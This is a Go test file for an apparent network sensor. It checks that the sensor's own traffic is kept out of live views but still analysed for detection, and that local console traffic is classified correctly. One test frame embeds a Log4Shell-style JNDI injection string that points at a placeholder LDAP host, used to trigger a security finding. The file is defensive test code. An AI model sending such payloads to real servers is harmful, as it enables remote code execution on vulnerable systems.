//go:build linux

package pipeline

import (
	"os"
	"testing"
	"time"

	"netprobe-ir/internal/analytics"
	"netprobe-ir/internal/capture"
	"netprobe-ir/internal/config"
	"netprobe-ir/internal/decode"
	"netprobe-ir/internal/model"
	"netprobe-ir/internal/procmap"
)

func TestSensorTrafficIsHiddenFromLiveViewsButRetainedForDetection(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := New(c)
	defer e.TrafficSeries.Close()
	now := time.Now().UTC()
	e.Proc.AddKernelEvent(procmap.KernelEvent{Proto: "TCP", LocalIP: "10.0.0.5", LocalPort: 50000, RemoteIP: "1.1.1.1", RemotePort: 80, PID: os.Getpid(), Time: now})
	selfFrame := capture.Frame{Time: now, Interface: "capture0", Direction: model.DirectionOutbound, Data: huntHTTPFrame("GET /?x=${jndi:ldap://bad.example/a} HTTP/1.1\r\nHost: target.example\r\nUser-Agent: curl\r\n\r\n")}
	e.ProcessFrame(selfFrame)
	if len(e.Flows(0)) != 1 || len(e.Packets(0)) != 1 || len(e.VisibleFlows(0)) != 0 || len(e.VisiblePackets(0)) != 0 || len(e.Processes()) != 0 {
		t.Fatal("sensor traffic was not separated from live views")
	}
	if _, ok := e.Process(os.Getpid()); !ok || len(e.Findings(0)) == 0 {
		t.Fatal("sensor evidence or security findings were lost")
	}
	if got := e.Hunt("", 100); got.Counts["flows"] != 0 || got.Counts["packets"] != 0 || got.Counts["findings"] == 0 {
		t.Fatalf("unexpected hunt visibility: %+v", got.Counts)
	}
	if page := e.AccessLog.Query("web", "", 0, 100); len(page.Items) != 0 {
		t.Fatal("sensor web requests appeared in the access view")
	}
	if status := e.Status(); status.Flows != 0 || status.ActiveFlows != 0 || status.Processes != 0 {
		t.Fatalf("sensor traffic inflated overview counts: %+v", status)
	}
	if result, err := e.Analytics.Query(analytics.Query{}); err != nil || result.ByType["flow"] != 0 {
		t.Fatalf("sensor flow appeared in advanced analytics: %+v, %v", result, err)
	}
	e.addRuntimeEvent(model.RuntimeEvent{PID: os.Getpid(), Kind: "connect", Time: now})
	if len(e.RuntimeEvents(10)) != 0 {
		t.Fatal("sensor runtime event appeared in the process view")
	}

	otherFrame := capture.Frame{Time: now.Add(100 * time.Millisecond), Interface: "capture0", Direction: model.DirectionOutbound, Data: v07TCPFrame(51000, 80, "GET / HTTP/1.1\r\nHost: other.example\r\n\r\n")}
	e.ProcessFrame(otherFrame)
	e.Telemetry.Tick(now.Add(time.Second), nil)
	snapshot, ok := e.Telemetry.Snapshot("capture0", now.Add(time.Second))
	if !ok || snapshot.Totals.Packets != 1 || snapshot.Totals.Bytes != uint64(len(otherFrame.Data)) {
		t.Fatalf("unexpected visible telemetry: %+v", snapshot)
	}
	if len(e.VisibleFlows(0)) != 1 || len(e.VisiblePackets(0)) != 1 {
		t.Fatal("unrelated traffic was filtered")
	}
	if status := e.Status(); status.Flows != 1 || status.ActiveFlows != 1 {
		t.Fatalf("unrelated traffic was missing from overview counts: %+v", status)
	}
}

func TestConsoleListenerTrafficUsesConfiguredLocalEndpoint(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Listen = "127.0.0.1:18443"
	c.Recorder.Enabled = false
	e := New(c)
	defer e.TrafficSeries.Close()
	cases := []struct {
		name   string
		packet decode.Packet
		want   bool
	}{
		{"client to console", decode.Packet{Protocol: "TCP", SrcIP: "127.0.0.1", SrcPort: 51000, DstIP: "127.0.0.1", DstPort: 18443}, true},
		{"console to client", decode.Packet{Protocol: "TCP", SrcIP: "127.0.0.1", SrcPort: 18443, DstIP: "127.0.0.1", DstPort: 51000}, true},
		{"remote same port", decode.Packet{Protocol: "TCP", SrcIP: "10.0.0.5", SrcPort: 51000, DstIP: "198.51.100.20", DstPort: 18443}, false},
		{"different local port", decode.Packet{Protocol: "TCP", SrcIP: "127.0.0.1", SrcPort: 51000, DstIP: "127.0.0.1", DstPort: 18444}, false},
		{"udp same port", decode.Packet{Protocol: "UDP", SrcIP: "127.0.0.1", SrcPort: 51000, DstIP: "127.0.0.1", DstPort: 18443}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := e.isConsoleTraffic(&tc.packet); got != tc.want {
				t.Fatalf("console traffic = %v, want %v", got, tc.want)
			}
		})
	}

	frame := v07TCPFrame(51000, 18443, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
	copy(frame[14+12:14+16], []byte{127, 0, 0, 1})
	copy(frame[14+16:14+20], []byte{127, 0, 0, 1})
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "lo", Direction: model.DirectionOutbound, Data: frame})
	if len(e.Flows(0)) != 1 || len(e.VisibleFlows(0)) != 0 || len(e.VisiblePackets(0)) != 0 {
		t.Fatal("configured console traffic remained visible")
	}
}
